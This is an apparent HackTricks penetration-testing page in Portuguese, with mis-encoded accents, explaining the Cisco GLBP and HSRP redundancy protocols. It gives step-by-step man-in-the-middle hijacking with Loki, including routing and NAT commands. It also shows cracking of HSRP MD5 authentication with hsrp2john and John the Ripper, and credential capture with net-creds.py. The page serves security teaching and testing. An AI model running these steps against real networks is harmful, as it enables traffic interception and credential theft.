# Ataques GLBP & HSRP

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


## Vis√£o Geral do Sequestro de FHRP

### Entendendo FHRP
First Hop Redundancy Protocol (FHRP) √© um conjunto de protocolos que garante a resili√™ncia da rede combinando m√∫ltiplos roteadores f√≠sicos em uma √∫nica entidade virtual. Isso melhora a distribui√ß√£o de carga e a toler√¢ncia a falhas. A Cisco Systems introduziu dois protocolos FHRP not√°veis: GLBP e HSRP.

### Detalhes do Protocolo GLBP
Desenvolvido pela Cisco, o GLBP (Gateway Load Balancing Protocol) opera no topo da pilha TCP/IP, utilizando UDP na porta 3222 para comunica√ß√£o. Roteadores dentro de um grupo GLBP enviam pacotes "hello" a cada 3 segundos. A aus√™ncia desses pacotes por 10 segundos de um roteador indica sua falha. No entanto, essas configura√ß√µes de temporizador s√£o ajust√°veis.

### Opera√ß√£o e Balanceamento de Carga do GLBP
O GLBP permite o compartilhamento de carga entre m√∫ltiplos roteadores usando um √∫nico IP virtual e v√°rios endere√ßos MAC virtuais. Cada roteador no grupo participa do encaminhamento de pacotes. O GLBP difere do HSRP/VRRP ao oferecer um verdadeiro balanceamento de carga, que inclui:

- **Dependente do Host:** Garante que um host receba o mesmo endere√ßo MAC do AVF, preservando configura√ß√µes de NAT.
- **Round-Robin:** O modo padr√£o onde os endere√ßos MAC do AVF s√£o distribu√≠dos alternadamente.
- **Round-Robin Baseado em Peso:** Balanceia a carga com base em uma m√©trica de "Peso" pr√©-definida.

### Pap√©is e Terminologia do Dom√≠nio GLBP
- **AVG (Active Virtual Gateway):** O roteador prim√°rio, distribuindo endere√ßos MAC para outros roteadores.
- **AVF (Active Virtual Forwarder):** Um roteador que lida com o tr√°fego de rede.
- **Prioridade GLBP:** Decide o AVG, com um padr√£o de 100 e varia√ß√£o de 1 a 255.
- **Peso GLBP:** Indica o n√≠vel de carga do roteador, ajust√°vel manualmente ou via Object Tracking.
- **Endere√ßo IP Virtual GLBP:** Atua como gateway padr√£o para dispositivos conectados.

Para comunica√ß√£o, o GLBP usa o endere√ßo multicast reservado 224.0.0.102 e a porta UDP 3222. Pacotes "hello" s√£o enviados a cada 3 segundos, e roteadores s√£o marcados como "mortos" se um pacote n√£o for recebido dentro de 10 segundos.

### Mecanismo de Ataque GLBP
Um atacante pode se tornar o roteador prim√°rio enviando um pacote GLBP com o valor de prioridade mais alto (255). Isso pode levar a ataques de DoS ou MITM, permitindo a intercepta√ß√£o ou redirecionamento do tr√°fego.

### Executando um Ataque GLBP com Loki
[Loki](https://github.com/raizo62/loki_on_kali) pode realizar um ataque GLBP injetando um pacote com prioridade e peso definidos para 255. As etapas pr√©-ataque envolvem coletar informa√ß√µes como o endere√ßo IP virtual, presen√ßa de autentica√ß√£o e valores de prioridade do roteador usando ferramentas como o Wireshark.

Etapas do Ataque:
1. Mude para o modo prom√≠scuo e habilite o encaminhamento de IP.
2. Identifique o roteador alvo e recupere seu IP.
3. Gere um ARP Gratuito.
4. Injete um pacote GLBP malicioso, se passando pelo AVG.
5. Atribua um endere√ßo IP secund√°rio √† interface de rede do atacante, espelhando o IP virtual GLBP.
6. Implemente SNAT para visibilidade completa do tr√°fego.
7. Ajuste o roteamento para garantir o acesso cont√≠nuo √† internet atrav√©s do roteador AVG original.

Seguindo essas etapas, o atacante se posiciona como um "homem no meio", capaz de interceptar e analisar o tr√°fego de rede, incluindo dados n√£o criptografados ou sens√≠veis.

Para demonstra√ß√£o, aqui est√£o os trechos de comandos necess√°rios:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoramento e intercepta√ß√£o de tr√°fego podem ser realizados usando net-creds.py ou ferramentas similares para capturar e analisar dados que fluem atrav√©s da rede comprometida.

### Explica√ß√£o Passiva do Sequestro de HSRP com Detalhes de Comandos

#### Vis√£o Geral do HSRP (Hot Standby Router/Redundancy Protocol)
HSRP √© um protocolo propriet√°rio da Cisco projetado para redund√¢ncia de gateway de rede. Ele permite a configura√ß√£o de m√∫ltiplos roteadores f√≠sicos em uma √∫nica unidade l√≥gica com um endere√ßo IP compartilhado. Esta unidade l√≥gica √© gerenciada por um roteador prim√°rio respons√°vel por direcionar o tr√°fego. Ao contr√°rio do GLBP, que usa m√©tricas como prioridade e peso para balanceamento de carga, HSRP depende de um √∫nico roteador ativo para gerenciamento de tr√°fego.

#### Pap√©is e Terminologia no HSRP
- **HSRP Active Router**: O dispositivo atuando como gateway, gerenciando o fluxo de tr√°fego.
- **HSRP Standby Router**: Um roteador de backup, pronto para assumir se o roteador ativo falhar.
- **HSRP Group**: Um conjunto de roteadores colaborando para formar um √∫nico roteador virtual resiliente.
- **HSRP MAC Address**: Um endere√ßo MAC virtual atribu√≠do ao roteador l√≥gico na configura√ß√£o do HSRP.
- **HSRP Virtual IP Address**: O endere√ßo IP virtual do grupo HSRP, atuando como gateway padr√£o para dispositivos conectados.

#### Vers√µes do HSRP
HSRP vem em duas vers√µes, HSRPv1 e HSRPv2, diferindo principalmente na capacidade do grupo, uso de IP multicast e estrutura do endere√ßo MAC virtual. O protocolo utiliza endere√ßos IP multicast espec√≠ficos para troca de informa√ß√µes de servi√ßo, com pacotes Hello enviados a cada 3 segundos. Um roteador √© presumido inativo se nenhum pacote for recebido dentro de um intervalo de 10 segundos.

#### Mecanismo de Ataque ao HSRP
Ataques ao HSRP envolvem tomar √† for√ßa o papel do Roteador Ativo injetando um valor de prioridade m√°ximo. Isso pode levar a um ataque Man-In-The-Middle (MITM). Passos pr√©-ataque essenciais incluem coletar dados sobre a configura√ß√£o do HSRP, o que pode ser feito usando Wireshark para an√°lise de tr√°fego.

#### Passos para Bypassar a Autentica√ß√£o do HSRP
1. Salve o tr√°fego de rede contendo dados do HSRP como um arquivo .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extraia hashes MD5 do arquivo .pcap usando hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Quebre os hashes MD5 usando John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Executando Inje√ß√£o de HSRP com Loki**

1. Inicie o Loki para identificar an√∫ncios de HSRP.
2. Defina a interface de rede para modo prom√≠scuo e habilite o encaminhamento de IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Use o Loki para mirar no roteador espec√≠fico, insira a senha HSRP quebrada e realize as configura√ß√µes necess√°rias para se passar pelo Roteador Ativo.
4. Ap√≥s ganhar o papel de Roteador Ativo, configure sua interface de rede e tabelas IP para interceptar o tr√°fego leg√≠timo.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifique a tabela de roteamento para direcionar o tr√°fego atrav√©s do antigo Roteador Ativo.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Use net-creds.py ou uma utilidade similar para capturar credenciais do tr√°fego interceptado.
```shell
sudo python2 net-creds.py -i eth0
```

Executar esses passos coloca o atacante em posi√ß√£o de interceptar e manipular o tr√°fego, de maneira similar ao procedimento para sequestro de GLBP. Isso destaca a vulnerabilidade em protocolos de redund√¢ncia como o HSRP e a necessidade de medidas de seguran√ßa robustas.


# Refer√™ncias
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
